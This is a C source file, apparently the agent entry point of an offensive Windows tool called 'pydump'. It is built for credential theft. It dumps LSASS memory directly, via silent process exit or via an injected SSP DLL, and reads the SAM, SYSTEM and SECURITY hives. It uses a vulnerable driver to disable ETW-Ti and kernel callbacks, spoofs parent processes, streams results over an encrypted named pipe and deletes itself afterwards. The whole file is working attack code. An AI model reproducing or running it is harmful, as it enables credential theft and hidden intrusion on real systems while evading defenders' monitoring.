/**
 * pydump agent — entry point. Zero kernel32/advapi32 dependencies.
 * Command line: agent.exe <MODE> <PID> <OUTPUT_NAME>
 *   mode & 4 = hive file reads (NtCreateFile + NtReadFile)
 *   mode & 2 = LSASS minidump
 *   mode & 1 = structured registry API reads (legacy)
 * Protocol: "PYD\x03" + registry section + LSASS MDMP.
 */

#include <windows.h>
#include "../include/syscalls.h"
#include "../include/agent.h"
#include "../include/registry.h"
#include "../include/byovd.h"

/* ── Helpers ─────────────────────────────────────────────── */

static DWORD wtoi(const wchar_t *s) {
    DWORD val = 0;
    while (*s >= L'0' && *s <= L'9') {
        val = val * 10 + (*s - L'0');
        s++;
    }
    return val;
}

/* ── Self-delete via NtSetInformationFile ────────────────── */

static void self_delete(void) {
    PUNICODE_STRING img_path = get_image_path();
    if (!img_path || !img_path->Buffer || !img_path->Length) return;

    wchar_t nt_path[520];
    nt_path[0] = L'\\';
    nt_path[1] = L'?';
    nt_path[2] = L'?';
    nt_path[3] = L'\\';
    int off = 4;

    wchar_t *src = img_path->Buffer;
    USHORT src_chars = img_path->Length / sizeof(wchar_t);
    for (USHORT i = 0; i < src_chars && off < 518; i++) {
        nt_path[off++] = src[i];
    }
    nt_path[off] = L'\0';

    UNICODE_STRING us;
    us.Length = (USHORT)(off * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
    us.Buffer = nt_path;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;

    NTSTATUS status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    struct {
        BOOLEAN ReplaceIfExists;
        BYTE    pad[7];
        HANDLE  RootDirectory;
        ULONG   FileNameLength;
        WCHAR   FileName[2];
    } rename_info;
    rename_info.ReplaceIfExists = 0;
    rename_info.pad[0] = 0; rename_info.pad[1] = 0; rename_info.pad[2] = 0;
    rename_info.pad[3] = 0; rename_info.pad[4] = 0; rename_info.pad[5] = 0;
    rename_info.pad[6] = 0;
    rename_info.RootDirectory = NULL;
    rename_info.FileNameLength = 4;
    rename_info.FileName[0] = L':';
    rename_info.FileName[1] = L'x';

    status = sys_NtSetInformationFile(hFile, &iosb, &rename_info,
                                       sizeof(rename_info), FileRenameInformation);
    sys_NtClose(hFile);
    if (!NT_SUCCESS(status)) return;

    status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    FILE_DISPOSITION_INFORMATION disp;
    disp.DeleteFile = TRUE;
    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp), FileDispositionInformation);
    sys_NtClose(hFile);
}

/* ── Service stub (mode 16) ──────────────────────────────── */

typedef BOOL (WINAPI *PFN_StartDispatcher)(PVOID);
typedef HANDLE (WINAPI *PFN_RegHandler)(LPCWSTR, PVOID);
typedef BOOL (WINAPI *PFN_SetSvcStatus)(HANDLE, PVOID);

typedef struct _SVC_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
} SVC_STATUS;

static void WINAPI svc_ctrl_handler(DWORD ctrl) {
    (void)ctrl;
}

static void WINAPI svc_main(DWORD argc, LPWSTR *argv) {
    (void)argc; (void)argv;

    PFN_RegHandler reg = (PFN_RegHandler)g_addr.pfnRegHandler;
    PFN_SetSvcStatus set = (PFN_SetSvcStatus)g_addr.pfnSetStatus;

    wchar_t name[] = L"";
    HANDLE h = reg(name, svc_ctrl_handler);
    if (!h) return;

    /* Tell SCM we need time (avoids 30s connection timeout) */
    SVC_STATUS ss;
    ss.dwServiceType = 0x10;
    ss.dwCurrentState = 2;      /* SERVICE_START_PENDING */
    ss.dwControlsAccepted = 0;
    ss.dwWin32ExitCode = 0;
    ss.dwServiceSpecificExitCode = 0;
    ss.dwCheckPoint = 1;
    ss.dwWaitHint = 30000;
    set(h, &ss);

    if (!resolve_syscalls()) {
        ss.dwCurrentState = 1;  /* SERVICE_STOPPED */
        ss.dwWin32ExitCode = 1;
        ss.dwCheckPoint = 0;
        ss.dwWaitHint = 0;
        set(h, &ss);
        return;
    }

    ss.dwCurrentState = 4;      /* SERVICE_RUNNING */
    ss.dwCheckPoint = 0;
    ss.dwWaitHint = 0;
    set(h, &ss);

    /* Write marker file to confirm SERVICE_RUNNING was reached */
    wchar_t marker_path[] = L"\\??\\C:\\Windows\\Temp\\_svcrun.tmp";
    UNICODE_STRING us_m;
    us_m.Buffer = marker_path;
    us_m.Length = 62;
    us_m.MaximumLength = 64;
    OBJECT_ATTRIBUTES oa_m;
    InitializeObjectAttributes(&oa_m, &us_m, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb_m;
    HANDLE hf = NULL;
    sys_NtCreateFile(&hf, 0x40110000, &oa_m, &iosb_m, NULL,
        0x80, 0, FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);
    if (hf) sys_NtClose(hf);

    /* Brief delay so SCM records RUNNING */
    LARGE_INTEGER delay;
    delay.QuadPart = -5000000LL; /* 500ms */
    sys_NtDelayExecution(FALSE, &delay);

    sys_NtTerminateProcess((HANDLE)-1, 1);
}

static void run_as_service(void) {
    PFN_StartDispatcher start =
        (PFN_StartDispatcher)g_addr.pfnStartDispatcher;

    wchar_t name[] = L"";
    struct {
        LPWSTR lpName;
        PVOID  lpProc;
        LPWSTR lpName2;
        PVOID  lpProc2;
    } table;
    table.lpName = name;
    table.lpProc = svc_main;
    table.lpName2 = NULL;
    table.lpProc2 = NULL;

    start(&table);
}

/* ── Enable SeDebugPrivilege (needed when not running as SYSTEM) ── */

static void enable_debug_privilege(void) {
    HANDLE token = NULL;
    NTSTATUS st = sys_NtOpenProcessToken((HANDLE)(LONG_PTR)-1,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    if (!NT_SUCCESS(st) || !token) return;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE_LUID_LOW;
    tp.Privileges[0].Luid.HighPart = SE_DEBUG_PRIVILEGE_LUID_HIGH;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    sys_NtAdjustPrivilegesToken(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    sys_NtClose(token);
}

/* ── Entry point ─────────────────────────────────────────── */

void main_entry(void) {
    PUNICODE_STRING cmdline_us = get_command_line();
    if (!cmdline_us || !cmdline_us->Buffer)
        return;

    wchar_t *p = cmdline_us->Buffer;

    /* Skip executable name */
    if (*p == L'"') {
        p++;
        while (*p && *p != L'"') p++;
        if (*p) p++;
    } else {
        while (*p && *p != L' ') p++;
    }
    while (*p == L' ') p++;

    /* Parse MODE */
    DWORD mode = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Parse PID */
    DWORD pid = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Output name */
    wchar_t *out_name = p;
    wchar_t *end = out_name;
    while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
    *end = L'\0';

    if (mode == 0 || out_name[0] == L'\0')
        return;

    /* Service stub: connect to SCM ASAP, resolve SSNs inside START_PENDING */
    if (mode == 16) {
        if (!resolve_service_funcs())
            return;
        run_as_service();
        return;
    }

    if (!resolve_syscalls())
        return;

    enable_debug_privilege();

    /* Mode 64: Silent Process Exit — trigger WerFault to dump LSASS.
       No NtReadVirtualMemory, no cross-process memory read. */
    if (mode == 64) {
        HANDLE lsass = NULL;
        if (g_addr.NtGetNextProcess) {
            HANDLE cursor = NULL, next = NULL;
            while (NT_SUCCESS(sys_NtGetNextProcess(cursor,
                    PROCESS_QUERY_INFORMATION, 0, 0, &next))) {
                if (cursor) sys_NtClose(cursor);
                cursor = next;
                BYTE zb[sizeof(PROCESS_BASIC_INFORMATION)];
                for (int i = 0; i < (int)sizeof(zb); i++) zb[i] = 0;
                PROCESS_BASIC_INFORMATION *ppbi = (PROCESS_BASIC_INFORMATION *)zb;
                ULONG ret;
                if (NT_SUCCESS(sys_NtQueryInformationProcess(cursor,
                        ProcessBasicInformation, ppbi, sizeof(*ppbi), &ret))
                    && (DWORD)(ULONG_PTR)ppbi->UniqueProcessId == pid) {
                    lsass = cursor;
                    break;
                }
            }
            if (!lsass && cursor) sys_NtClose(cursor);
        }

        NTSTATUS spe_st = (NTSTATUS)0xC0000001; /* STATUS_UNSUCCESSFUL */
        if (lsass && g_addr.RtlReportSilentProcessExit) {
            typedef NTSTATUS (NTAPI *PFN_SPE)(HANDLE, NTSTATUS);
            PFN_SPE pfn = (PFN_SPE)g_addr.RtlReportSilentProcessExit;
            spe_st = pfn(lsass, 0);
            sys_NtClose(lsass);
        } else if (lsass) {
            spe_st = (NTSTATUS)0xC0000002; /* SPE not resolved */
            sys_NtClose(lsass);
        }

        HANDLE pipe = open_named_pipe(out_name);
        if (pipe) {
            init_pipe_cipher(out_name);
            BYTE magic[4] = {'P', 'Y', 'D', 0x03};
            write_pipe(pipe, magic, 4);
            DWORD zero = 0;
            write_pipe(pipe, &zero, 4);
            write_pipe(pipe, &zero, 4);
            write_pipe(pipe, &zero, 4);
            write_pipe(pipe, &spe_st, 4);
            close_pipe(pipe);
        }

        self_delete();
        sys_NtTerminateProcess((HANDLE)-1, NT_SUCCESS(spe_st) ? 0 : 5);
        return;
    }

    /* Mode 128: SSP DLL injection — credential extraction inside LSASS.
       Zero NtReadVirtualMemory, zero ETW-Ti events. */
    if (mode == 128) {
        wchar_t dll_path[280];
        int dp = 0;
        wchar_t dpfx[] = L"C:\\Windows\\Temp\\s_";
        for (int i = 0; dpfx[i]; i++) dll_path[dp++] = dpfx[i];
        wchar_t *pn = out_name;
        while (*pn && dp < 270) dll_path[dp++] = *pn++;
        dll_path[dp++] = L'.'; dll_path[dp++] = L'd';
        dll_path[dp++] = L'l'; dll_path[dp++] = L'l';
        dll_path[dp] = L'\0';

        /* Read SSP output: \??\C:\Windows\Temp\s_<out_name>.dat */
        wchar_t dat_path[280];
        int dap = 0;
        wchar_t datpfx[] = L"\\??\\C:\\Windows\\Temp\\s_";
        for (int i = 0; datpfx[i]; i++) dat_path[dap++] = datpfx[i];
        pn = out_name;
        while (*pn && dap < 270) dat_path[dap++] = *pn++;
        dat_path[dap++] = L'.'; dat_path[dap++] = L'd';
        dat_path[dap++] = L'a'; dat_path[dap++] = L't';
        dat_path[dap] = L'\0';

        UNICODE_STRING us_d;
        us_d.Buffer = dat_path;
        us_d.Length = (USHORT)(dap * 2);
        us_d.MaximumLength = us_d.Length + 2;
        OBJECT_ATTRIBUTES oa_d;
        InitializeObjectAttributes(&oa_d, &us_d, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK iosb_d;
        HANDLE hDat = NULL;

        NTSTATUS st_d = sys_NtCreateFile(&hDat, 0x80100000,
            &oa_d, &iosb_d, NULL, 0,
            FILE_SHARE_READ | FILE_SHARE_DELETE, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
            NULL, 0);

        HANDLE pipe = open_named_pipe(out_name);
        if (pipe) {
            init_pipe_cipher(out_name);
            BYTE magic[4] = {'P', 'Y', 'D', 0x03};
            write_pipe(pipe, magic, 4);
            DWORD zero = 0;
            write_pipe(pipe, &zero, 4);
            write_pipe(pipe, &zero, 4);
            write_pipe(pipe, &zero, 4);

            if (NT_SUCCESS(st_d) && hDat) {
                BYTE rbuf[4096];
                for (;;) {
                    IO_STATUS_BLOCK rio;
                    NTSTATUS rs = sys_NtReadFile(hDat, NULL, NULL, NULL,
                        &rio, rbuf, sizeof(rbuf), NULL, NULL);
                    if (!NT_SUCCESS(rs) || rio.Information == 0) break;
                    write_pipe(pipe, rbuf, (DWORD)rio.Information);
                }
            }
            close_pipe(pipe);
        }

        if (hDat) {
            FILE_DISPOSITION_INFORMATION dsp;
            dsp.DeleteFile = TRUE;
            sys_NtSetInformationFile(hDat, &iosb_d, &dsp, sizeof(dsp),
                FileDispositionInformation);
            sys_NtClose(hDat);
        }

        /* Delete the SSP DLL */
        dll_path[dp] = L'\0';
        wchar_t ntdll_path[280];
        int ndp = 0;
        wchar_t ntp[] = L"\\??\\";
        for (int i = 0; ntp[i]; i++) ntdll_path[ndp++] = ntp[i];
        for (int i = 0; i < dp && ndp < 276; i++)
            ntdll_path[ndp++] = dll_path[i];
        ntdll_path[ndp] = L'\0';
        UNICODE_STRING us_dl;
        us_dl.Buffer = ntdll_path;
        us_dl.Length = (USHORT)(ndp * 2);
        us_dl.MaximumLength = us_dl.Length + 2;
        OBJECT_ATTRIBUTES oa_dl;
        InitializeObjectAttributes(&oa_dl, &us_dl, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK iosb_dl;
        HANDLE hDll = NULL;
        if (NT_SUCCESS(sys_NtCreateFile(&hDll, 0x00110000,
                &oa_dl, &iosb_dl, NULL, 0,
                FILE_SHARE_READ | FILE_SHARE_DELETE, FILE_OPEN,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                NULL, 0)) && hDll) {
            FILE_DISPOSITION_INFORMATION dsp;
            dsp.DeleteFile = TRUE;
            sys_NtSetInformationFile(hDll, &iosb_dl, &dsp, sizeof(dsp),
                FileDispositionInformation);
            sys_NtClose(hDll);
        }

        self_delete();
        sys_NtTerminateProcess((HANDLE)-1, 0);
        return;
    }

    /* Child mode: raw LSASS dump, no XOR, no PYD header */
    if (mode & 8) {
        HANDLE pipe = open_named_pipe(out_name);
        if (!pipe) { sys_NtTerminateProcess((HANDLE)-1, 3); return; }
        BOOL success = dump_lsass(pid, pipe, NULL, 0);
        close_pipe(pipe);
        sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
        return;
    }

    HANDLE pipe = open_named_pipe(out_name);
    if (!pipe) {
        sys_NtTerminateProcess((HANDLE)-1, 3);
        return;
    }

    init_pipe_cipher(out_name);

    BYTE magic[4] = {'P', 'Y', 'D', 0x03};
    write_pipe(pipe, magic, 4);

    /* Registry: hive file reads (mode 4) or structured API reads (mode 1) */
    if (mode & 4) {
        init_registry();
        dump_hive_files(pipe);
    } else if (mode & 1) {
        init_registry();
        dump_registry_hives(pipe);
    } else {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4); /* system_len = 0 */
        write_pipe(pipe, &zero, 4); /* sam_len = 0 */
        write_pipe(pipe, &zero, 4); /* security_len = 0 */
    }

    /* BYOVD: disable ETW-Ti via vulnerable driver before LSASS dump */
    BOOL etwti_ok = FALSE;
    DWORD byovd_status = 0;
    DWORD byovd_pid = 0;
    if (mode & 256) {
        if (byovd_open()) {
            int rc = byovd_disable_etwti();
            if (rc == 0) {
                byovd_status = 0x10;
                etwti_ok = TRUE;
                if (byovd_get_drv_type() == 3)
                    byovd_pid = pid;
            } else {
                byovd_status = (DWORD)(0x100 | ((-rc) & 0xFF));
            }
        }
    }

    /* OB callback bypass only needed for non-KKYUM drivers */
    BOOL ob_ok = FALSE;
    if (etwti_ok && (mode & 2) && !byovd_pid) {
        int ob_rc = byovd_disable_ob_callbacks();
        if (ob_rc == 0)
            ob_ok = TRUE;
    }

    if (mode & 256) {
        write_pipe(pipe, &byovd_status, 4);
        BYOVD_DEBUG *dbg = byovd_get_debug();
        write_pipe(pipe, dbg, sizeof(BYOVD_DEBUG));
    }

    /* LSASS dump — mode 32: spawn child with PPID spoofing,
       otherwise direct dump */
    BOOL success = TRUE;
    if (mode & 2) {
        if (mode & 32) {
            success = spawn_lsass_child(pid, pipe, out_name);
        } else {
            success = dump_lsass(pid, pipe, NULL, byovd_pid);
        }
    }

    if (ob_ok)
        byovd_restore_ob_callbacks();
    if (etwti_ok)
        byovd_restore_etwti();
    if (mode & 256)
        byovd_close();

    close_pipe(pipe);
    self_delete();

    sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
}
